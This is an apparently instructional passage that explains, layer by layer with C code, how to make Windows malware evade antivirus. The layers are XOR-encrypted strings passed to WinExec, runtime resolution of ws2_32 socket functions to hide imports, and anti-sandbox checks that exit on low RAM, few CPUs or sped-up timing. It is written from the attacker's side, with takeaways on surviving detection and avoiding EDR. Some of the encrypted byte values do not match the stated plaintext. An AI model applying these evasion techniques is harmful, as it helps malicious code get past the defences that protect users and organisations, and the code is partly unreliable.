Layer-by-Layer Breakdown

Layer 1: XOR Obfuscation

Strings like "cmd.exe" and "ws2_32.dll" are signatures. We encrypt them at compile time and decrypt at runtime.

// Compile-time XOR encryption #define XOR_KEY 0xB5 // "cmd.exe" encrypted with XOR 0xB5 unsigned char cmd[] = {0xF6, 0xF0, 0xF7, 0xD4, 0xF0, 0xF1, 0x00}; void decrypt(char* data, size_t len) { for (size_t i = 0; i < len; i++) { data[i] ^= XOR_KEY; } } // Usage: decrypt(cmd, sizeof(cmd)); // Now cmd contains "cmd.exe" WinExec(cmd, 0); // AV string scan sees garbage, not "cmd.exe"
Why XOR and not AES?

XOR is reversible with the same operation. No key schedule, no IV, no padding. One byte of code, one byte decrypted. AES would add a library dependency (crypt32.dll) — another signature.

Layer 2: Dynamic API Resolution

Instead of listing imports in the PE header, we resolve them at runtime using GetProcAddress.

// Instead of linking at compile time: // #pragma comment(lib, "ws2_32.lib") // We resolve at runtime: HMODULE hWs2 = LoadLibraryA("ws2_32.dll"); // "ws2_32.dll" is XOR encrypted FARPROC pSocket = GetProcAddress(hWs2, "socket"); // "socket" is XOR encrypted FARPROC pConnect = GetProcAddress(hWs2, "connect"); // Now we can call socket() without it appearing in the IAT // AV static analysis: "This program imports nothing suspicious" // Reality: It resolves everything at runtime

Layer 3: Anti-Sandbox

Sandboxes (Cuckoo, ANY.RUN) run malware in VMs to analyze behavior. We detect the VM and exit.

// Anti-sandbox checks: // 1. RAM check — VMs often have < 2GB MEMORYSTATUSEX mem; mem.dwLength = sizeof(mem); GlobalMemoryStatusEx(&mem); if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { exit(0); // Less than 2GB RAM = probably VM } // 2. CPU check — VMs often have 1-2 cores SYSTEM_INFO si; GetSystemInfo(&si); if (si.dwNumberOfProcessors < 2) { exit(0); // Single core = probably VM } // 3. Timing check — VMs are slow DWORD start = GetTickCount(); Sleep(5000); DWORD elapsed = GetTickCount() - start; if (elapsed < 4000) { exit(0); // Sleep returned early = time acceleration detected }
⚠️ The sandbox arms race

Modern sandboxes have 8GB RAM, 4 cores, and patch timing functions. Layer 3 alone is not enough. Combine with other layers for defense in depth.

Key Takeaways

  • Evasion is layers, not tricks: One layer fails, the next catches. Eight layers = eight chances to survive.
  • Static analysis is blind to runtime: XOR strings, dynamic APIs, anti-sandbox — all invisible until execution.
  • Behavioral analysis needs behavior: If you do nothing suspicious (no network, no registry), EDR has nothing to flag.
  • MinGW > MSVC for evasion: No Microsoft compiler signatures, no standard library bloat.
